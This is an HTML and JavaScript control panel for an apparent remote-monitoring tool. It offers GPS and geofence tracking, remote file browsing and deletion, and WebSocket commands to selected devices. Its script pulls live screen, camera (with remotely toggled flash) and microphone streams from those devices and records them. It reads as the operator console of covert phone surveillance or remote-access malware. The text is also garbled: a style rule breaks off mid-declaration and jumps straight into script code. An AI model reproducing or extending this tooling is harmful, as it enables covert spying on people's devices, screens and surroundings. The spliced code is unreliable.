<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>SystemSync Console · Remote Monitoring</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
    <style>
        /* ========== All existing styles (unchanged) ========== */
        :root {
            --primary: #0f62fe;
            --primary-hover: #0353e9;
            --bg-body: #f4f7fb;
            --bg-surface: #ffffff;
            --text-main: #12161b;
            --text-sec: #5c6a7a;
            --border: #e2e8f0;
            --danger: #e02424;
            --danger-bg: #fdf2f2;
            --success: #057a55;
            --success-bg: #f3faf7;
            --radius-sm: 8px;
            --radius-md: 12px;
            --radius-lg: 16px;
            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            --shadow-lg: 0 10px 25px rgba(0, 0, 0, 0.08);
            --glass-bg: rgba(255, 255, 255, 0.65);
            --glass-border: rgba(255, 255, 255, 0.4);
        }

        .overview-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 24px;
        }

        .stat-card-premium {
            background: white;
            padding: 24px;
            border-radius: var(--radius-lg);
            border: 1px solid var(--border);
            box-shadow: var(--shadow-sm);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            border-bottom: 4px solid var(--primary);
        }

        .stat-card-premium:hover {
            transform: translateY(-6px);
            box-shadow: var(--shadow-lg);
        }

        .live-pulse {
            width: 10px;
            height: 10px;
            background: #10b981;
            border-radius: 50%;
            display: inline-block;
            margin-right: 12px;
            box-shadow: 0 0 0 rgba(16, 185, 129, 0.4);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
            70% { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* ========== Premium GPS & Geofence Styles ========== */
        .premium-panel {
            background: rgba(255, 255, 255, 0.7);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: var(--radius-lg);
            padding: 24px;
            box-shadow: var(--shadow-lg);
            margin-bottom: 24px;
        }

        .gps-stat-card {
            background: white;
            padding: 16px;
            border-radius: var(--radius-md);
            border: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            gap: 4px;
        }

        .gps-stat-card .label {
            font-size: 11px;
            font-weight: 700;
            color: var(--text-sec);
            text-transform: uppercase;
        }

        .gps-stat-card .value {
            font-size: 18px;
            font-weight: 700;
            color: var(--text-main);
        }

        .radius-slider-container {
            margin: 20px 0;
            padding: 16px;
            background: #f8fafc;
            border-radius: var(--radius-md);
        }

        .radius-slider-container label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 12px;
            color: var(--text-sec);
        }

        input[type="range"].premium-slider {
            width: 100%;
            height: 6px;
            background: #e2e8f0;
            border-radius: 5px;
            outline: none;
            -webkit-appearance: none;
        }

        input[type="range"].premium-slider::-webkit-slider-thumb {
            -webkit-appearance: none;
            appearance: none;
            width: 20px;
            height: 20px;
            background: var(--primary);
            border-radius: 50%;
            cursor: pointer;
            box-shadow: 0 0 10px rgba(15, 98, 254, 0.3);
        }

        .history-timeline-item {
            position: relative;
            padding: 16px 16px 16px 40px;
            border-bottom: 1px solid var(--border);
            cursor: pointer;
            transition: 0.2s;
        }

        .history-timeline-item:hover {
            background: #f1f5f9;
        }

        .history-timeline-item::before {
            content: '';
            position: absolute;
            left: 18px;
            top: 24px;
            bottom: -10px;
            width: 2px;
            background: #e2e8f0;
        }

        .history-timeline-item:last-child::before {
            display: none;
        }

        .history-timeline-item::after {
            content: '';
            position: absolute;
            left: 14px;
            top: 20px;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: var(--primary);
            border: 2px solid white;
            box-shadow: 0 0 0 2px rgba(15, 98, 254, 0.1);
        }

        .premium-table th {
            cursor: pointer;
            transition: all 0.2s;
            position: relative;
            background: #f8fafc;
            padding: 14px 16px;
            border-bottom: 2px solid var(--border);
        }

        .premium-table th:hover {
            background: #f1f5f9;
            color: var(--primary);
        }

        .sort-indicator {
            font-size: 14px;
            margin-left: 6px;
            display: inline-block;
            vertical-align: middle;
            color: var(--primary);
            font-weight: 700;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: var(--bg-body);
            font-family: 'Inter', system-ui, sans-serif;
            display: flex;
            height: 100vh;
            overflow: hidden;
            color: var(--text-main);
        }

        button,
        input,
        select,
        textarea {
            font-family: inherit;
        }

        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }

        ::-webkit-scrollbar-track {
            background: transparent;
        }

        ::-webkit-scrollbar-thumb {
            background: #cbd5e1;
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #94a3b8;
        }

        #sidebar {
            width: 280px;
            background: rgba(255, 255, 255, 0.6);
            backdrop-filter: blur(16px);
            border-right: 1px solid rgba(255, 255, 255, 0.4);
            padding: 20px 16px;
            overflow-y: auto;
            flex-shrink: 0;
            box-shadow: 1px 0 10px rgba(0, 0, 0, 0.02);
            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            z-index: 200;
        }

        .logo {
            font-size: 20px;
            font-weight: 700;
            color: var(--primary);
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
            letter-spacing: -0.5px;
        }

        #sidebarCloseBtn {
            display: none;
            background: none;
            border: none;
            font-size: 20px;
            cursor: pointer;
            color: var(--text-sec);
        }

        .section {
            margin-bottom: 24px;
        }

        .section-title {
            font-size: 11px;
            font-weight: 700;
            color: #94a3b8;
            text-transform: uppercase;
            margin-bottom: 10px;
            letter-spacing: 0.5px;
            padding-left: 8px;
        }

        #sidebar button {
            width: 100%;
            padding: 10px 14px;
            margin: 2px 0;
            background: transparent;
            color: var(--text-main);
            border: none;
            border-radius: var(--radius-sm);
            font-size: 14px;
            font-weight: 500;
            text-align: left;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        #sidebar button span:first-child {
            font-size: 16px;
            opacity: 0.8;
        }

        #sidebar button:hover {
            background: #f0f4f8;
            color: var(--primary);
            transform: translateX(2px);
        }

        .camera-panel {
            background: #f8fafc;
            border-radius: var(--radius-sm);
            padding: 16px;
            margin: 8px 0 16px;
            border: 1px solid var(--border);
            display: none;
        }

        .camera-panel.show {
            display: block;
            animation: slideDown 0.2s ease-out;
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-5px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .camera-option {
            margin: 8px 0;
            font-size: 13px;
            display: flex;
            gap: 12px;
        }

        .camera-option label {
            color: var(--text-main);
            display: flex;
            align-items: center;
            gap: 4px;
            cursor: pointer;
        }

        .capture-btn,
        .live-btn {
            background: var(--primary);
            color: white;
            border: none;
            padding: 10px;
            border-radius: var(--radius-sm);
            cursor: pointer;
            width: 100%;
            margin-top: 12px;
            font-weight: 600;
            transition: 0.2s;
        }

        .capture-btn:hover,
        .live-btn:hover {
            background: var(--primary-hover);
            box-shadow: 0 4px 10px rgba(15, 98, 254, 0.2);
        }

        #main {
            flex: 1;
            display: flex;
            flex-direction: column;
            min-width: 0;
            background: var(--bg-body);
        }

        #header {
            height: 64px;
            background: rgba(255, 255, 255, 0.7);
            backdrop-filter: blur(16px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.4);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 24px;
            flex-shrink: 0;
            box-shadow: var(--shadow-sm);
            z-index: 10;
        }

        #menuBtn {
            display: none;
            background: #f1f5f9;
            border: none;
            border-radius: var(--radius-sm);
            padding: 8px;
            font-size: 18px;
            cursor: pointer;
            color: var(--text-main);
            transition: 0.2s;
        }

        #menuBtn:hover {
            background: #e2e8f0;
        }

        #headerTitle {
            font-size: 16px;
            font-weight: 600;
            color: var(--text-main);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        #serverInfo {
            font-weight: 400;
            color: var(--text-sec);
            font-size: 14px;
            margin-left: 8px;
        }

        #status {
            padding: 6px 16px;
            border-radius: 20px;
            background: #eff6ff;
            color: var(--primary);
            font-size: 13px;
            font-weight: 600;
            letter-spacing: 0.5px;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }

        #status::before {
            content: '';
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: var(--primary);
            box-shadow: 0 0 6px var(--primary);
        }

        #status.offline {
            background: var(--danger-bg);
            color: var(--danger);
        }

        #status.offline::before {
            background: var(--danger);
            box-shadow: 0 0 6px var(--danger);
        }

        #reconnectBtn {
            background: var(--bg-surface);
            color: var(--text-sec);
            border: 1px solid var(--border);
            border-radius: 50%;
            width: 32px;
            height: 32px;
            font-size: 14px;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            transition: 0.2s;
            margin-left: 10px;
        }

        #reconnectBtn:hover {
            background: #f1f5f9;
            color: var(--text-main);
            transform: rotate(45deg);
        }

        #content {
            flex: 1;
            padding: 24px;
            overflow: auto;
        }

        #main-panel {
            background: var(--bg-surface);
            border-radius: var(--radius-md);
            padding: 32px;
            min-height: 100%;
            box-shadow: var(--shadow-sm);
            border: 1px solid var(--border);
        }

        #main-panel h3 {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 20px;
            color: var(--text-main);
        }

        #main-panel p {
            color: var(--text-sec);
            margin-bottom: 20px;
            font-size: 14px;
            line-height: 1.6;
        }

        table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
            font-size: 14px;
            margin-top: 10px;
            border: 1px solid var(--border);
            border-radius: var(--radius-md);
            overflow: hidden;
            display: table;
        }

        th {
            background: #f8fafc;
            padding: 12px 16px;
            text-align: left;
            color: var(--text-sec);
            font-weight: 600;
            border-bottom: 1px solid var(--border);
            text-transform: uppercase;
            font-size: 12px;
            letter-spacing: 0.5px;
        }

        td {
            padding: 14px 16px;
            border-bottom: 1px solid #f1f5f9;
            color: var(--text-main);
            vertical-align: middle;
        }

        tr:last-child td {
            border-bottom: none;
        }

        tbody tr {
            transition: background 0.15s;
        }

        tbody tr:hover {
            background: #f8fafc;
        }

        .pagination {
            margin-top: 20px;
            display: flex;
            gap: 8px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .page-btn {
            padding: 6px 14px;
            border: 1px solid #cbd5e1;
            background: white;
            border-radius: var(--radius-sm);
            cursor: pointer;
            font-size: 13px;
            font-weight: 500;
            transition: 0.2s;
        }

        .page-btn:hover {
            border-color: var(--primary);
            color: var(--primary);
        }

        #authContainer,
        #deviceListContainer {
            position: fixed;
            inset: 0;
            background: rgba(244, 247, 251, 0.7);
            backdrop-filter: blur(12px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 20000;
        }

        #authBox,
        #deviceListBox {
            background: rgba(255, 255, 255, 0.9);
            padding: 40px;
            border-radius: var(--radius-lg);
            width: 400px;
            max-width: 90%;
            box-shadow: var(--shadow-lg);
            border: 1px solid rgba(255, 255, 255, 0.4);
            animation: fadeInScale 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        @keyframes fadeInScale {
            from {
                opacity: 0;
                transform: translateY(20px) scale(0.95);
            }

            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        #authBox h2,
        #deviceListBox h2 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 24px;
            text-align: center;
            color: var(--text-main);
            letter-spacing: -0.5px;
        }

        #authBox input {
            width: 100%;
            padding: 14px 16px;
            margin: 8px 0;
            background: #f8fafc;
            border: 1px solid #cbd5e1;
            border-radius: var(--radius-sm);
            font-size: 14px;
            outline: none;
            transition: 0.2s;
        }

        #authBox input:focus {
            border-color: var(--primary);
            background: #fff;
            box-shadow: 0 0 0 4px rgba(15, 98, 254, 0.1);
        }

        #authBox button,
        #logoutBtn {
            width: 100%;
            padding: 14px;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: var(--radius-sm);
            cursor: pointer;
            font-size: 15px;
            font-weight: 600;
            transition: all 0.2s;
            margin-top: 12px;
        }

        #authBox button:hover,
        #logoutBtn:hover {
            background: var(--primary-hover);
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(15, 98, 254, 0.25);
        }

        #logoutBtn {
            background: #f1f5f9;
            color: var(--text-main);
            border: 1px solid #cbd5e1;
            margin-top: 24px;
        }

        #logoutBtn:hover {
            background: #e2e8f0;
            color: var(--danger);
            box-shadow: none;
            border-color: #cbd5e1;
        }

        .toggle-link {
            color: var(--text-sec);
            font-size: 14px;
            font-weight: 500;
            text-align: center;
            margin-top: 24px;
            cursor: pointer;
            transition: 0.2s;
            text-decoration: none;
            display: block;
            background: #f1f5f9;
            padding: 12px;
            border-radius: var(--radius-sm);
        }

        .toggle-link:hover {
            color: var(--primary);
            background: #e2e8f0;
            transform: translateY(-1px);
        }

        .device-item {
            display: flex;
            align-items: center;
            padding: 16px;
            border: 1px solid var(--border);
            border-radius: var(--radius-md);
            margin-bottom: 12px;
            cursor: pointer;
            transition: 0.2s;
            background: var(--bg-surface);
        }

        .device-item:hover {
            transform: translateY(-2px);
            border-color: var(--primary);
            box-shadow: var(--shadow-md);
        }

        .device-info {
            flex: 1;
            margin-left: 16px;
        }

        .device-name {
            font-size: 16px;
            font-weight: 600;
            color: var(--text-main);
            margin-bottom: 4px;
        }

        .device-id {
            font-size: 13px;
            color: var(--text-sec);
            font-family: monospace;
        }

        .device-arrow {
            color: var(--primary);
            font-size: 20px;
            font-weight: bold;
            opacity: 0;
            transform: translateX(-10px);
            transition: 0.2s;
        }

        .device-item:hover .device-arrow {
            opacity: 1;
            transform: translateX(0);
        }

        /* File Manager Tree View */
        .file-toolbar-sticky {
            position: sticky;
            top: 0;
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(8px);
            z-index: 10;
            padding: 12px 0;
            border-bottom: 1px solid var(--border);
            display: flex;
            gap: 12px;
            margin-bottom: 16px;
        }

        .tree-root {
            list-style: none;
            padding-left: 0;
        }

        .tree-children {
            display: grid;
            grid-template-rows: 0fr;
            transition: grid-template-rows 0.3s ease-out;
        }

        .tree-children.expanded {
            grid-template-rows: 1fr;
        }

        .tree-children-inner {
            overflow: hidden;
            padding-left: 20px;
            list-style: none;
            border-left: 1px dashed var(--border);
            margin-left: 10px;
            padding-top: 4px;
            padding-bottom: 4px;
        }

        .folder-header,
        .file-row {
            display: flex;
            align-items: center;
            padding: 8px 12px;
            border-radius: var(--radius-sm);
            cursor: pointer;
            transition: 0.15s;
            border: 1px solid transparent;
            position: relative;
        }

        .folder-header:hover,
        .file-row:hover {
            background: #f8fafc;
            border-color: var(--border);
        }

        .folder-icon {
            font-size: 18px;
            margin-right: 12px;
            width: 24px;
            text-align: center;
            color: #fbbf24;
        }

        .file-icon {
            font-size: 18px;
            margin-right: 12px;
            width: 24px;
            text-align: center;
            color: #94a3b8;
        }

        .chevron {
            font-size: 12px;
            margin-right: 8px;
            transition: transform 0.3s;
            color: var(--text-sec);
            display: inline-block;
            width: 12px;
        }

        .chevron.down {
            transform: rotate(90deg);
        }

        .item-name {
            font-size: 14px;
            font-weight: 500;
            color: var(--text-main);
            flex: 1;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            user-select: none;
        }

        .file-size {
            font-size: 12px;
            color: var(--text-sec);
            margin-left: 10px;
        }

        .file-actions {
            opacity: 0;
            transition: opacity 0.2s;
            margin-left: 16px;
            display: inline-flex;
            gap: 6px;
        }

        .file-row:hover .file-actions {
            opacity: 1;
        }

        .file-action-btn {
            background: #fff;
            border: 1px solid var(--border);
            border-radius: 4px;
            padding: 4px 8px;
            font-size: 12px;
            cursor: pointer;
            transition: 0.2s;
            display: inline-flex;
            align-items: center;
        }

        .file-action-btn:hover {
            background: #f1f5f9;
            box-shadow: var(--shadow-sm);
        }

        .file-action-btn.dl:hover {
            color: var(--primary);
            border-color: var(--primary);
        }

        .file-action-btn.del:hover {
            color: var(--danger);
            border-color: var(--danger);
        }

        /* New checkbox style */
        .file-checkbox {
            margin-right: 10px;
            width: 18px;
            height: 18px;
            cursor: pointer;
        }

        #map,
        #historyMap {
            border-radius: var(--radius-md);
            box-shadow: var(--shadow-sm);
            border: 1px solid var(--border);
        }

        .map-info {
            position: absolute;
            top: 20px;
            left: 20px;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(8px);
            padding: 12px 16px;
            border-radius: var(--radius-sm);
            font-size: 13px;
            font-weight: 500;
            border-left: 4px solid var(--primary);
            z-index: 1000;
            box-shadow: var(--shadow-md);
            max-width: 280px;
        }

        .current-location-marker {
            background: #0f62fe;
            border-radius: 50%;
            width: 14px;
            height: 14px;
            border: 2px solid white;
            box-shadow: 0 0 0 4px rgba(15, 98, 254, 0.3);
        }

        .btn-ui {
            padding: 8px 16px;

        // ==================== WEBSOCKET ====================
        function connectWebSocket() {
            if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;
            if (reconnectTimer) clearTimeout(reconnectTimer);
            setStatus('CONNECTING');
            if (wsDebug) wsDebug.innerText = '🌐 WebSocket: connecting...';
            panel.innerHTML = '⏳ Connecting to server...';
            ws = new WebSocket(CONFIG.WS_URL);
            ws.onopen = () => { reconnectAttempts = 0; ws.send('I_AM_WEB'); setStatus('ONLINE'); panel.innerHTML = '✅ Connected to server. Ready.'; if (wsDebug) wsDebug.innerText = '🌐 WebSocket: ONLINE'; };
            ws.onmessage = e => handleIncomingMessage(e.data);
            ws.onclose = () => { setStatus('OFFLINE'); if (wsDebug) wsDebug.innerText = '🌐 WebSocket: closed'; panel.innerHTML = '🔌 WebSocket disconnected. <a href="#" onclick="manualReconnect()">Reconnect</a>.'; ws = null; const d = Math.min(1000 * Math.pow(1.5, reconnectAttempts), CONFIG.MAX_RECONNECT_DELAY); reconnectAttempts++; reconnectTimer = setTimeout(() => connectWebSocket(), d); };
            ws.onerror = () => { setStatus('ERROR'); if (wsDebug) wsDebug.innerText = '🌐 WebSocket: error'; };
        }

        function manualReconnect() { if (reconnectTimer) clearTimeout(reconnectTimer); if (ws) ws.close(); reconnectAttempts = 0; connectWebSocket(); }

        function sendPing() {
            if (!selectedDeviceId) return showNotification('No device selected');
            const btn = document.getElementById('pingBtn');
            if (!btn) return;
            const originalText = btn.innerHTML;
            btn.innerHTML = '⏳...';
            btn.disabled = true;
            
            sendCommand('PING');
            
            // Timeout if no response in 5s
            window._pingTimeout = setTimeout(() => {
                if (btn.disabled) {
                    btn.innerHTML = originalText;
                    btn.disabled = false;
                    showNotification('❌ Ping Timeout - Device may be offline');
                }
            }, 5000);
        }

        function sendCommand(cmd, params = {}) {
            if (!ws || ws.readyState !== WebSocket.OPEN) { panel.innerHTML = '<div style="color:#d32f2f;">⚠ WebSocket not connected. <a href="#" onclick="manualReconnect()">Reconnect</a>.</div>'; return; }
            const payload = { type: 'COMMAND', command: cmd, requestId: 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5), params, deviceId: selectedDeviceId, timestamp: Date.now() };
            ws.send(JSON.stringify(payload));
            panel.innerHTML = `<div style="color:#1976ff;">📤 Command sent: ${cmd}</div>`;
            pendingCommand = cmd;
            setTimeout(() => { if (pendingCommand === cmd) pendingCommand = null; }, 10000);
        }

        function sendPlainText(t) { if (ws && ws.readyState === WebSocket.OPEN) ws.send(t); }

        // ==================== WEBRTC ====================
        function createPeerConnection(type, onTrack, useMic, iceServers = CONFIG.ICE_SERVERS) {
            const pc = new RTCPeerConnection({ iceServers: iceServers });
            if (type === 'screen') pc.addTransceiver('video', { direction: 'recvonly' });
            else if (type === 'camera') { pc.addTransceiver('video', { direction: 'recvonly' }); if (useMic) pc.addTransceiver('audio', { direction: 'recvonly' }); }
            else if (type === 'audio') pc.addTransceiver('audio', { direction: 'recvonly' });
            pc.ontrack = onTrack;
            pc.onicecandidate = e => { if (e.candidate) sendSignaling({ type: 'ICE_CANDIDATE', candidate: e.candidate, streamType: type }); };
            pc.oniceconnectionstatechange = () => {
                console.log(`${type} ICE state:`, pc.iceConnectionState);
                if (pc.iceConnectionState === 'failed') showNotification(`${type} connection failed. Check STUN/TURN.`);
                else if (pc.iceConnectionState === 'connected') showNotification(`${type} connected!`);
            };
            return pc;
        }

        function sendSignaling(msg) { if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ type: 'SIGNALING', deviceId: selectedDeviceId, data: msg })); }

        function handleSignaling(msg) {
            if (msg.type === 'ANSWER') {
                const pc = msg.streamType === 'screen' ? screenPC : msg.streamType === 'camera' ? cameraPC : audioPC;
                if (pc) {
                    pc.setRemoteDescription(new RTCSessionDescription({ type: 'answer', sdp: msg.sdp }))
                        .then(() => console.log(`${msg.streamType} remote description set`))
                        .catch(err => {
                            console.error(`${msg.streamType} setRemoteDescription error:`, err);
                            showNotification(`RTC Error: ${err.message}`);
                        });
                }
            } else if (msg.type === 'ICE_CANDIDATE') {
                const pc = msg.streamType === 'screen' ? screenPC : msg.streamType === 'camera' ? cameraPC : audioPC;
                if (pc && msg.candidate) {
                    pc.addIceCandidate(new RTCIceCandidate(msg.candidate))
                        .catch(err => console.warn('addIceCandidate error:', err));
                }
            }
        }

        async function toggleScreen() {
            if (screenActive) {
                if (screenPC) screenPC.close(); screenPC = null; screenActive = false;
                document.getElementById('screenBtn').innerText = 'Start Screen';
                document.getElementById('screenModalOverlay').classList.remove('show');
                sendSignaling({ type: 'STOP_SCREEN' });
                if (screenMediaRecorder && screenMediaRecorder.state === 'recording') screenMediaRecorder.stop();
                screenMediaRecorder = null;
                screenRecordedChunks = [];
                const modalVideo = document.getElementById('modalScreenVideo');
                if (modalVideo) modalVideo.srcObject = null;
            } else {
                document.getElementById('screenModalOverlay').classList.add('show');
                document.body.classList.add('modal-open');
                const modalVideo = document.getElementById('modalScreenVideo');
                if (modalVideo) modalVideo.srcObject = null;
                screenPC = createPeerConnection('screen', e => {
                    const modalVideo = document.getElementById('modalScreenVideo');
                    if (modalVideo && e.streams[0]) {
                        modalVideo.srcObject = e.streams[0];
                        console.log('Screen stream received');
                    }
                }, false);
                try {
                    const offer = await screenPC.createOffer();
                    await screenPC.setLocalDescription(offer);
                    sendSignaling({ type: 'OFFER', sdp: offer.sdp, streamType: 'screen' });
                    document.getElementById('screenBtn').innerText = 'Stop Screen';
                    screenActive = true;
                    screenMediaRecorder = null;
                    screenRecordedChunks = [];
                    document.getElementById('modalRecordBtn').innerText = '🔴';
                } catch (e) {
                    console.error('Screen share failed:', e);
                    showNotification('Failed: ' + e.message);
                    screenPC = null;
                    document.getElementById('screenModalOverlay').classList.remove('show');
                    document.body.classList.remove('modal-open');
                }
            }
        }

        function snapScreenFromModal() {
            const video = document.getElementById('modalScreenVideo');
            if (!video || !video.videoWidth) {
                alert('No active screen share or video not ready yet. Please wait a moment.');
                return;
            }
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.download = `screen-${Date.now()}.png`;
                a.href = url;
                a.click();
                URL.revokeObjectURL(url);
                showNotification('Screenshot saved');
            }, 'image/png');
        }

        function toggleScreenRecording() {
            const video = document.getElementById('modalScreenVideo');
            if (!video || !video.srcObject) {
                alert('No active screen share. Start screen share first.');
                return;
            }
            if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
                screenMediaRecorder.stop();
                document.getElementById('modalRecordBtn').innerText = '🔴';
                showNotification('Recording stopped');
            } else {
                if (video.videoWidth === 0) {
                    video.addEventListener('loadedmetadata', () => startScreenRecording(), { once: true });
                } else {
                    startScreenRecording();
                }
            }
        }

        function startScreenRecording() {
            const video = document.getElementById('modalScreenVideo');
            if (!video || !video.videoWidth) {
                alert('Video not ready. Please wait.');
                return;
            }
            screenRecordedChunks = [];
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            const drawFrame = () => {
                if (video.videoWidth && video.videoHeight) {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                }
                requestAnimationFrame(drawFrame);
            };
            drawFrame();
            const canvasStream = canvas.captureStream(30);
            const originalStream = video.srcObject;
            if (originalStream && originalStream.getAudioTracks().length) {
                originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
            }
            screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
            screenMediaRecorder.ondataavailable = e => {
                if (e.data.size > 0) screenRecordedChunks.push(e.data);
            };
            screenMediaRecorder.onstop = () => {
                const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `screen-recording-${Date.now()}.webm`;
                a.click();
                URL.revokeObjectURL(url);
                screenRecordedChunks = [];
                showNotification('Recording saved');
            };
            screenMediaRecorder.start(1000);
            document.getElementById('modalRecordBtn').innerText = '🟢';
            showNotification('Recording started');
        }

        function toggleFullscreen() {
            const video = document.getElementById('modalScreenVideo');
            if (!video) return;
            if (!document.fullscreenElement) {
                video.requestFullscreen().catch(err => console.warn('Fullscreen error:', err));
            } else {
                document.exitFullscreen();
            }
        }

        function closeScreenModal() {
            if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
                screenMediaRecorder.stop();
            }
            document.getElementById('screenModalOverlay').classList.remove('show');
            document.body.classList.remove('modal-open');
            if (screenActive) {
                if (screenPC) screenPC.close();
                screenPC = null;
                screenActive = false;
                document.getElementById('screenBtn').innerText = 'Start Screen';
                sendSignaling({ type: 'STOP_SCREEN' });
            }
            const modalVideo = document.getElementById('modalScreenVideo');
            if (modalVideo) modalVideo.srcObject = null;
            document.getElementById('modalRecordBtn').innerText = '🔴';
        }

        document.getElementById('modalSnapBtn').addEventListener('click', snapScreenFromModal);
        document.getElementById('modalRecordBtn').addEventListener('click', toggleScreenRecording);
        document.getElementById('modalFullscreenBtn').addEventListener('click', toggleFullscreen);
        document.getElementById('modalCloseBtn').addEventListener('click', closeScreenModal);

        // ==================== CAMERA MODAL ====================
        function showCameraModal(stream, cameraType, useFlash = false) {
            const modal = document.getElementById('cameraModalOverlay');
            const video = document.getElementById('modalCameraVideo');
            video.srcObject = stream;
            currentCameraStream = stream;
            modal.classList.add('show');
            document.body.classList.add('modal-open');
            
            // Activate flash and start heartbeat if requested and using back camera
            if (useFlash && cameraType === 'back') {
                sendCommand('FLASH_ON');
                if (flashHeartbeat) clearInterval(flashHeartbeat);
                flashHeartbeat = setInterval(() => sendCommand('FLASH_ON'), 5000); 
            }
            let recording = false, recorder = null, chunks = [];
            document.getElementById('cameraSnapBtn').onclick = () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(b => { const a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = `snapshot_${Date.now()}.png`; a.click(); URL.revokeObjectURL(b); });
            };
            document.getElementById('cameraRecordBtn').onclick = () => {
                if (recording && recorder) { recorder.stop(); document.getElementById('cameraRecordBtn').innerText = '🔴'; recording = false; }
                else {
                    chunks = [];
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    const draw = () => { ctx.drawImage(video, 0, 0, canvas.width, canvas.height); requestAnimationFrame(draw); };
                    draw();
                    const canvasStream = canvas.captureStream(30);
                    if (stream.getAudioTracks().length) stream.getAudioTracks().forEach(t => canvasStream.addTrack(t));
                    recorder = new MediaRecorder(canvasStream);
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const a = document.createElement('a');
                        a.href = URL.createObjectURL(blob);
                        a.download = `recording_${Date.now()}.webm`;
                        a.click();
                        URL.revokeObjectURL(blob);
                        canvasStream.getTracks().forEach(t => t.stop());
                    };
                    recorder.start();
                    recording = true;
                    document.getElementById('cameraRecordBtn').innerText = '🟢';
                }
            };
            document.getElementById('cameraFullscreenBtn').onclick = () => { if (video.requestFullscreen) video.requestFullscreen(); };
            document.getElementById('cameraCloseBtn').onclick = () => {
                if (flashHeartbeat) { clearInterval(flashHeartbeat); flashHeartbeat = null; }
                if (recorder && recorder.state === 'recording') recorder.stop();
                if (stream) stream.getTracks().forEach(t => t.stop());
                modal.classList.remove('show');
                document.body.classList.remove('modal-open');
                if (cameraPC) cameraPC.close();
                cameraPC = null;
                sendSignaling({ type: 'STOP_CAMERA' });
                sendCommand('FLASH_OFF');
            };
        }

